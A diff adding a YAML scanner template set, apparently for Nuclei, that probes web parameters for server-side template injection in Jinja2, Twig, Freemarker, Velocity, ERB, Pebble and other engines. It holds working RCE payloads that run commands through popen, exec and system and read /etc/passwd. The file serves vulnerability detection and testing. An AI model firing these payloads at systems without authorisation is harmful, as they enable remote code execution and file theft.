@@ -1,0 +1,239 @@
+id: ssti-detection
+
+info:
+  name: Server-Side Template Injection Detection
+  author: ancarna
+  severity: high
+  description: Detects Server-Side Template Injection vulnerabilities across multiple template engines
+  tags: ssti,injection,rce,owasp-top10
+  classification:
+    cwe-id: 1336
+  reference:
+    - https://portswigger.net/web-security/server-side-template-injection
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        # Mathematical expression probes (universal)
+        - "{{7*7}}"
+        - "${7*7}"
+        - "<%= 7*7 %>"
+        - "#{7*7}"
+        - "*{7*7}"
+        - "@(7*7)"
+        # Jinja2/Twig specific
+        - "{{7*'7'}}"
+        - "{{config}}"
+        - "{{self}}"
+        # Freemarker
+        - "${7*7}"
+        - "<#assign x=7*7>${x}"
+        # Velocity
+        - "#set($x=7*7)$x"
+        # Smarty
+        - "{php}echo 7*7;{/php}"
+        - "{7*7}"
+        # Mako
+        - "${7*7}"
+        - "<%  x=7*7 %>${x}"
+        # Pebble
+        - "{{7*7}}"
+        # Thymeleaf
+        - "[[${7*7}]]"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "49"
+        name: math-expression
+
+      - type: word
+        part: body
+        words:
+          - "7777777"
+        name: string-multiply
+
+---
+id: ssti-jinja2
+
+info:
+  name: SSTI - Jinja2 (Python)
+  author: ancarna
+  severity: critical
+  description: Detects Jinja2 template injection with RCE potential
+  tags: ssti,jinja2,python,rce
+  classification:
+    cwe-id: 1336
+  reference:
+    - https://portswigger.net/web-security/server-side-template-injection
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        - "{{config.__class__.__init__.__globals__['os'].popen('echo SSTI_JINJA2_RCE').read()}}"
+        - "{{''.__class__.__mro__[1].__subclasses__()}}"
+        - "{{request.application.__globals__.__builtins__.__import__('os').popen('echo SSTI_JINJA2_RCE').read()}}"
+        - "{{cycler.__init__.__globals__.os.popen('echo SSTI_JINJA2_RCE').read()}}"
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SSTI_JINJA2_RCE"
+
+---
+id: ssti-twig
+
+info:
+  name: SSTI - Twig (PHP)
+  author: ancarna
+  severity: critical
+  description: Detects Twig template injection
+  tags: ssti,twig,php,rce
+  classification:
+    cwe-id: 1336
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        - "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+        - "{{['id']|filter('system')}}"
+        - "{{app.request.server.all|join(',')}}"
+        - "{{'/etc/passwd'|file_excerpt(1,30)}}"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "uid=[0-9]+.*gid=[0-9]+"
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+---
+id: ssti-freemarker
+
+info:
+  name: SSTI - Freemarker (Java)
+  author: ancarna
+  severity: critical
+  description: Detects Freemarker template injection
+  tags: ssti,freemarker,java,rce
+  classification:
+    cwe-id: 1336
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        - "<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"echo SSTI_FREEMARKER_RCE\")}"
+        - "${\"freemarker.template.utility.Execute\"?new()(\"echo SSTI_FREEMARKER_RCE\")}"
+        - "<#assign ob=\"freemarker.template.utility.ObjectConstructor\"?new()>${ob(\"java.lang.ProcessBuilder\",\"echo\",\"SSTI_FREEMARKER_RCE\").start()}"
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SSTI_FREEMARKER_RCE"
+
+---
+id: ssti-velocity
+
+info:
+  name: SSTI - Velocity (Java)
+  author: ancarna
+  severity: critical
+  description: Detects Apache Velocity template injection
+  tags: ssti,velocity,java,rce
+  classification:
+    cwe-id: 1336
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        - "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('echo SSTI_VELOCITY_RCE'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end"
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SSTI_VELOCITY_RCE"
+
+---
+id: ssti-erb-ruby
+
+info:
+  name: SSTI - ERB (Ruby)
+  author: ancarna
+  severity: critical
+  description: Detects ERB template injection in Ruby applications
+  tags: ssti,erb,ruby,rce
+  classification:
+    cwe-id: 1336
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        - "<%= system('echo SSTI_ERB_RCE') %>"
+        - "<%= `echo SSTI_ERB_RCE` %>"
+        - "<%= IO.popen('echo SSTI_ERB_RCE').read %>"
+        - "<%= File.read('/etc/passwd') %>"
+    stop-at-first-match: true
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SSTI_ERB_RCE"
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+
+---
+id: ssti-pebble
+
+info:
+  name: SSTI - Pebble (Java)
+  author: ancarna
+  severity: critical
+  description: Detects Pebble template injection
+  tags: ssti,pebble,java,rce
+  classification:
+    cwe-id: 1336
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}{{path}}?{{param}}={{payload}}"
+    payloads:
+      payload:
+        - "{% set cmd = 'echo SSTI_PEBBLE_RCE' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(([bytes]).toArray()) }}"
+    stop-at-first-match: true
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "SSTI_PEBBLE_RCE"
